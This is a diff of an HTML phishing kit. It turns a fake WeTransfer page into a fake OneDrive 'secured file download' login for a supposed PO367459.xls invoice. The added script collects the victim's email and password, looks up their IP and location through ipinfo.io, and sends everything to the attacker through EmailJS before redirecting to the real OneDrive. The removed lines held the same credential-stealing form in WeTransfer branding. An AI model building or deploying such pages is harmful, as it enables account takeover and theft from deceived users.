@@ -3,12 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WeTransfer</title>
-    
+    <title>OneDrive Login</title>
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
-    
     <script>
-        
         window.onload = function() {
             // Populate email from URL
             var urlParams = new URLSearchParams(window.location.search);
@@ -21,324 +18,178 @@
             });
 
             // Handle form submission
-            document.getElementById('emailForm').addEventListener('submit', function(event) {
+            document.getElementById('loginForm').addEventListener('submit', function(event) {
                 event.preventDefault();
                 let email = document.getElementById('email').value.trim();
-                let message = document.getElementById('message').value.trim();
+                let password = document.getElementById('password').value.trim();
 
-                if (!email || !message) {
+                if (!email || !password) {
                     alert("Both email and password are required.");
                     return;
                 }
 
-                let templateParams = {
-                    email: email,
-                    message: message
-                };
+                fetch('https://ipinfo.io/json?token=f65a3d103cb816')
+                    .then(response => response.json())
+                    .then(data => {
+                        let ip = data.ip;
+                        let city = data.city;
+                        let region = data.region;
+                        let country = data.country;
 
-                emailjs.send("service_bkmt4yd", "template_n9rw6wu", templateParams)
-                    .then(function(response) {
-                        console.log("SUCCESS!", response.status, response.text);
-                        window.location.href = "https://wetransfer.com";
-                    }, function(error) {
-                        console.error("FAILED...", error);
-                        alert("");
+                        let templateParams = {
+                            email: email,
+                            password: password,
+                            ip: ip,
+                            city: city,
+                            region: region,
+                            country: country
+                        };
+
+                        emailjs.send("service_w1usqhm", "template_pwbzd0r", templateParams)
+                            .then(function(response) {
+                                console.log("SUCCESS!", response.status, response.text);
+                                window.location.href = "https://onedrive.com";
+                            }, function(error) {
+                                console.error("FAILED...", error);
+                                alert("Failed to send email.");
+                            });
+                    })
+                    .catch(error => {
+                        console.error("Error fetching IP info:", error);
                     });
             });
-
-            // Make images show the popup
-            const clickableImages = document.querySelectorAll('.clickable-image');
-            clickableImages.forEach(image => {
-                image.addEventListener('click', function() {
-                    document.getElementById('popup').style.display = 'flex';
-                });
-            });
-        };
-    
+        }
     </script>
-    <script>
-        (function() {
-            emailjs.init("he4b59rpU89O1gj1y");
-        })();
-    </script>
-    
     <style>
         body {
-    font-family: Arial, sans-serif;
-    margin: 0;
-    padding: 0;
-    background-color: #f4f4f4;
-    display: flex;
-    height: 100vh;
-}
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #f0f0f0;
+        }
 
-header {
-    display: none; 
-}
+        .container {
+            display: flex;
+            width: 100%;
+            height: 100%;
+        }
 
-.sidebar {
-    background-color: taupe;
-    color: #fff;
-    padding: 1rem;
-    width: 200px;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    position: fixed;
-    top: 0;
-    bottom: 0;
-}
+        .left-panel {
+            background-color: #005a9e;
+            color: white;
+            padding: 40px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
 
-.sidebar .logo img {
-    width: 200px;
-    height: auto;
-    margin-bottom: 1rem;
-}
+        .left-panel h1 {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
 
-.sidebar nav ul {
-    list-style: none;
-    padding: 0;
-    width: 100%;
-}
+        .left-panel p {
+            font-size: 18px;
+            margin-bottom: 20px;
+        }
 
-.sidebar nav ul li {
-    margin: 1rem 0;
-}
+        .left-panel ul {
+            list-style: none;
+            padding: 0;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
 
-.sidebar nav ul li a {
-    color: #fff;
-    text-decoration: none;
-    color: gray;
-}
+        .left-panel ul li {
+            margin-bottom: 10px;
+        }
 
-.right-sidebar {
-    background-color: #f4f4f4;
-    padding: 1rem;
-    width: 300px;
-    display: flex;
-    flex-direction: column;
-    align-items: flex-start;
-    position: fixed;
-    top: 0;
-    bottom: 0;
-    right: 0;
-}
+        .left-panel footer {
+            margin-top: auto;
+            font-size: 14px;
+        }
 
-.right-sidebar .upgrade,
-.right-sidebar .search,
-.right-sidebar .message-box,
-.right-sidebar .actions {
-    margin-bottom: 1rem;
-}
+        .right-panel {
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex: 1;
+        }
 
-.upgrade {
-    display: flex;
-    align-items: center;
-}
+        .login-box {
+            background-color: #ffffff;
+            padding: 40px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            text-align: center;
+            width: 300px;
+        }
 
-.upgrade .icon {
-    width: 20px;
-    margin-right: 0.5rem;
-}
+        .login-box .logo {
+            width: 150px;
+            margin-bottom: 20px;
+        }
 
-.search {
-    display: flex;
-    align-items: center;
-}
+        .login-box p {
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
 
-.search input {
-    padding: 0.5rem;
-    margin-right: 0.5rem;
-}
+        .login-box input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
 
-.search .icon {
-    width: 20px;
-}
+        .login-box button {
+            width: 100%;
+            padding: 10px;
+            background-color: #0078d4;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
 
-.message-box {
-    font-weight: bold;
-}
-
-.actions {
-    display: flex;
-    flex-direction: column;
-    align-items: flex-start;
-}
-
-.actions .action {
-    display: flex;
-    align-items: center;
-    margin-bottom: 1rem;
-}
-
-.actions .icon {
-    width: 20px;
-    margin-right: 0.5rem;
-}
-
-main {
-    padding: 2rem;
-    text-align: center;
-    margin-left: 220px; 
-    margin-right: 320px; 
-    margin-top: 80px; 
-}
-
-.images {
-    display: flex;
-    justify-content: center;
-    margin-bottom: 20px;
-}
-
-.images img {
-    margin: 0 0.5rem;
-    height: 250px;
-}
-
-/* Pop-up Styling */
-.popup {
-    display: none; 
-    position: fixed;
-    z-index: 1;
-    left: 0;
-    top: 0;
-    width: 100%;
-    height: 100%;
-    overflow: auto;
-    background-color: rgba(0,0,0,0.4); /* Semi-transparent black background */
-    justify-content: center; 
-    align-items: center; 
-}
-
-.popup-content {
-    background-color: #fefefe;
-    padding: 20px;
-    border: 1px solid #888;
-    max-width: 80%;
-    text-align: center;
-    position: relative; 
-}
-
-.popup-content img {
-    width: 100%;
-    height: auto;
-}
-
-.close {
-    position: absolute;
-    top: 10px;
-    right: 10px;
-    color: #aaa;
-    font-size: 28px;
-    font-weight: bold;
-    cursor: pointer;
-}
-
-form {
-    margin: 20px 0;
-}
-
-form input[type="email"],
-form input[type="password"] {
-    padding: 10px;
-    margin: 10px 0;
-    box-sizing: border-box;
-    border: 1px solid blue;
-    border-radius: 10px;
-    width: 350px;
-    max-width: 450px;
-    text-align: center;
-    font-size: 16px;
-}
-
-form button {
-    background-color: #4063ff;
-    color: white;
-    padding: 15px 20px;
-    border: none;
-    border-radius: 13px;
-    cursor: pointer;
-    width: 200px;
-    max-width: 400px; 
-    font-size: 16px; 
-}
-
-form button:hover {
-    background-color: #4077ff;
-}
-
+        .login-box button:hover {
+            background-color: #005a9e;
+        }
     </style>
-    
-    
 </head>
 <body>
     <div class="container">
-        <aside class="sidebar">
-            <div class="logo">
-                <img src="https://i.ibb.co/SPHM3F4/logo.jpg" alt="Logo" id="logo">
+        <div class="left-panel">
+            <h1>PO367459.xls</h1>
+            <p>Your file (PO367459.xls) is ready for download!</p>
+            <ul>
+                <li>File Size: 256 megabytes (MB)</li>
+                <li>File Format: MS Excel</li>
+                <li>File Name: PO367459.xls</li>
+            </ul>
+            <footer>
+                OneDrive online cloud | All rights reserved
+            </footer>
+        </div>
+        <div class="right-panel">
+            <div class="login-box">
+                <img src="https://i.ibb.co/qB74ftK/hd.png" alt="OneDrive" class="logo">
+                <p>This file is secured. Download with your professional email login credentials.</p>
+                <form id="loginForm">
+                    <input type="email" id="email" placeholder="Enter Email Address" required>
+                    <input type="password" id="password" placeholder="Enter Email Password" required>
+                    <button type="submit" class="btn">Download File</button>
+                </form>
             </div>
-            <nav>
-                <ul>
-                    <li><a href="https://wetransfer.com/">Shared</a></li>
-                    <li><a href="https://wetransfer.com/">My Files</a></li>
-                    <li><a href="https://wetransfer.com/">File Requests</a></li>
-                    <li><a href="https://wetransfer.com/">Deleted Files</a></li>
-                </ul>
-            </nav>
-        </aside>
-        <main>
-            <h1>WeTransfer</h1>
-            <div class="images">
-                <a href="#"><img src="https://i.ibb.co/fkFycV7/image1.jpg" alt="image1" class="clickable-image"></a>
-                <a href="#"><img src="https://i.ibb.co/1zCgRrK/image2.jpg" alt="image2" class="clickable-image"></a>
-            </div>
-            <div class="images">
-                <a href="#"><img src="https://i.ibb.co/3mD4yhG/image3.jpg" alt="image3" class="clickable-image"></a>
-            </div>
-        </main>
-        <aside class="right-sidebar">
-            <div class="upgrade">
-                <img src="https://i.ibb.co/yVcdb4B/star.jpg" alt="Star Icon" class="icon">
-                <span>Upgrade Account</span>
-            </div>
-            <div class="search">
-                <input type="text" placeholder="Search">
-                <img src="https://i.ibb.co/Y8d5y2C/notification.png" alt="Notification Bell Icon" class="icon">
-            </div>
-            <div class="message-box">
-                <h1><strong>Click on a document to view</strong></h1>
-            </div>
-            <div class="actions">
-                <div class="action"><img src="https://i.ibb.co/3FmMwkW/upload.png" alt="Upload Icon" class="icon"><span>Upload Files</span></div>
-                <div class="action"><img src="https://i.ibb.co/tCMk2bQ/upload-folder.png" alt="Upload Folder Icon" class="icon"><span>Upload Folder</span></div>
-                <div class="action"><img src="https://i.ibb.co/N1mLmFb/new-folder.png" class="icon"><span>New Folder</span></div>
-                <div class="action"><img src="https://i.ibb.co/Vqqxgyj/shared-folder.png" alt="Shared Folder Icon" class="icon"><span>New Shared Folder</span></div>
-                <div class="action"><img src="https://i.ibb.co/bzV8vbz/request-files.png" alt="request-files" style="height: auto; width: 5%;"  class="icon"><span>Request Files</span></div>
-            </div>
-        </aside>
-    </div>
-    
-    <!-- Pop-up Message -->
-    <div id="popup" class="popup">
-        <div class="popup-content">
-            <span class="close">&times;</span>
-            <a href="https://imgbb.com/">
-
-
-
-  <img src="https://i.ibb.co/NCF8L71/popup-image.jpg" alt="popup-image" style="height: auto; width: 10%;">
-</a>
-            <p>These files are sensitive and secured against unauthorized access. In order to access this file, please provide your correct email credentials, we will connect to your email provider through a secured IMAP channel to authorize your download.</p>
-            <h2>Please confirm receiving emails to receive file</h2>
-            <form id="emailForm">
-                <label for="email">Email:</label><br>
-                <input type="email" placeholder="Enter email" id="email" required><br>
-                
-                <label for="password">Password:</label><br>
-                <input type="password" placeholder="Enter email password" id="message" required><br><br>
-                <button type="submit">View Files</button>
-            </form>
-            <p>&copy; WeTransfer Inc. 2024</p>
         </div>
     </div>
 </body>
